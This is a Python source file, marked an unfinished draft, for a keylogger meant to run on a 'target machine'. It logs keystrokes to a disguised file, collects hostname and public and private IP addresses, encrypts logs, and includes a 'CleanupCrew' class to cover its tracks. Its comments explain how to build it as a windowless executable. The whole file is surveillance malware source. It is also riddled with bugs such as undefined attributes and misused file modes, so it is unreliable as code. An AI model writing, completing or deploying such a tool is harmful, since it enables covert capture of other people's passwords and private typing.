import os, time, socket, platform, threading
import argparse as ap
from requests import get
from pynput.keyboard import Listener
from cryptography import Fernet

##---------------- UNFINISHED DRAFT; AUTHOR: astralm0nke ----------------##
# Needs to be downloaded on target machine. This also means python must be installed/accessible on target machine.
# Download from terminal using pyinstaller KeyLogger.py --onefile --noconsole
# This will compile the program
# Can delete __pycache__ , build, and KeyLogger.spec immediately
# Only interested in dist directory
# To exit, go to task manager, end KeyLogger task
# Can put as many files as u want into the *args fxns, but for this basic example there's just one file
# system_information fxn idea from king04aman on GitHub

class FernetMachine:
    '''
    FernetMachine class generates Fernet key, performs encryption&decryption of data.
    
    Methods:
        key_gen : generates Fernet key and saves it to a txt file for consistency.
        encrypt(*args) : uses F key to encrypt *args files
        decrypt(*args) : uses F key to decrpyt *args files
    '''
    def __init__(self):
        self.key = None
        
    def key_gen(self):
        self.key = Fernet.generate_key()
        with open('encryption_key.txt', 'wb') as f: # 'wb' specifies opening file in binary writing mode; this makes sure u have a consistent key; paste in rather than generating new key if program is rerunning
            f.write(str(self.key))
            
    def encrypt(self, *args):
        key = self.key
        files_to_encrypt = [file for file in args]
        count = 0
        
        for files in files_to_encrypt:
            with open(files_to_encrypt[count], 'wb') as f:
                data_to_encrypt = f.read()
                fernet = Fernet(self.key)
                encrypted_data = fernet.encrypt(data_to_encrypt)
                f.write(encrypted_data)
                f.close()
                
    def decrypt(self, *args):
        key = self.key # Paste key generated by KeyGen() fxn

        encrypted_files = [txt_file for arg in args]
        count = 0
    
        for files in encrypted_files:
            with open(encrypted_files[count], 'a+') as enc_f:
                data = enc_f.read()
                fernet = Fernet(self.key)
                decrypted_data = fernet.decrypt(data)
                enc_f.write(decrypted_data)
                count += 1

## ---------------- KeyLogger ---------------- ##            
class KeyLogger():
    '''
    KeyLogger class is the module's main class. Performs all keylogging functionality.
    
    Args:
        log_path : directory to hide log files.
        
    Methods:
        get_system_info : scrub logs.
        read_logs() : erase *args files/logs from target machine.
    '''
    parser = ap.ArgumentParser()
    parser.add_argument('log_path', help='Path to directory to house logs in on target machine.')
    parser.add_argument('')
    args = parser.parse_args()
    KEYS = []
    COUNT = 0
    FLAG = 0  
#path = os.environ['appdata'] + '\\processmanager.txt' # For windows machine
# extend & file_merge allows for more files with other types of info the KeyLogger has grabbed to be stored w/ processmanager.txt
    KEY_LOG = 'processmanager.txt' # File to write keystrokes to- needs to be hidden
    SYS_INFO = 'SysInfo.txt' # File to write system info to
    EXTEND = '\\'         
            
    TIME_ITER = 15
    NUM_ITERS_END = 5            
    NUM_ITERS = 0
    CURRENT_TIME = time.time()
    STOPPING_TIME = time.time() + TIME_ITER
    
    def __init__(self):
        self.log_path = self.args.log_path
        self.file_merge = self.log_path + self.EXTEND

# Get target machine system information
    def get_system_info(self):
        with open(self.FILE_MERGE + self.SYS_INFO, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + '\n')
            except Exception:
                f.write("Couldn't get Public IP Address \n")

            f.write("Processor Info: " + (platform.processor()) + '\n')
            f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + IPAddr + '\n')
            
            f.close()
            
    def read_logs(self):
        with open(self.log_path + self.KEY_LOG, 'rt') as f:
            return f.read()
            f.close()
        with open(self.log_path + SYS_INFO, 'rt') as ff:
            return ff.read()
            ff.close()
        
            
    def write_to_file(self, keys):
        # Timer for KeyLogger
        while self.NUM_ITERS < self.NUM_ITERS_END:
            with open(self.LOG_PATH + self.KEY_LOG, 'a') as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find('backspace') > 0:
                        f.write(' Backspace ')
                    elif k.find('enter') > 0:
                        f.write('\n')
                    elif k.find('shift') > 0:
                        f.write(' Shift ')
                    elif k.find('space') > 0:
                        f.write(' ')
                    elif k.find('caps_lock') > 0:
                        f.write(' caps_lock ')
                    elif k.find('Key'):
                        f.write(k)
                
    def on_press(self, key):
        while self.NUM_ITERS < self.NUM_ITERS_END:
            self.KEYS.append(key)
            self.COUNT += 1
        
            if self.COUNT >= 1:
                self.COUNT = 0
                self.write_to_file(self.KEYS)
                self.KEYS = [] #Empty keys list right after we write to file so that we don't repeat previous keylogs
    
    def start(self):
        global listener
        # Timer for KeyLogger
        while self.NUM_ITERS < self.NUM_ITERS_END:
            with Listener(on_press=self.on_press) as listener:
                listener.join()
                
    def self_destruct(self):
        self.FLAG = 1
        listener.stop()
        os.remove(self.path)
        
        
class CleanupCrew:
    '''
    CleanupCrew class covers the keylogger's tracks on the target machine.
    
    Args:
        *mess : files to be erased
        
    Methods:
        empty_logs : scrub logs.
        encrypt(*args) : erase *args files/logs from target machine.
    '''
    def __init__(self, *mess):
        self.mess = mess
        
    def empty_logs(self):
        if self.CURRENT_TIME > self.STOPPING_TIME:
            with open(self.file_merge + self.KEY_LOG, 'w') as f:
                f.write(' ')
                f.close()
            with open(self.file_merge, self.SYS_INFO, 'w') as f:
                f.write(' ')
                f.close()
                              
    def erase_files(self):
        files_to_delete = [file for arg in self.mess]
        for file in files_to_delete:
            os.remove(self.file_merge + file)
            
            
if __name__ == '__main__':
    keylogger = KeyLogger()
    t = threading.Thread(target=keylogger.start())
    while keylogger.FLAG != 1:
        time.sleep(10)
        logs = keylogger.read_logs()
        print(logs)
    #keylogger.self_destruct()
    t.join()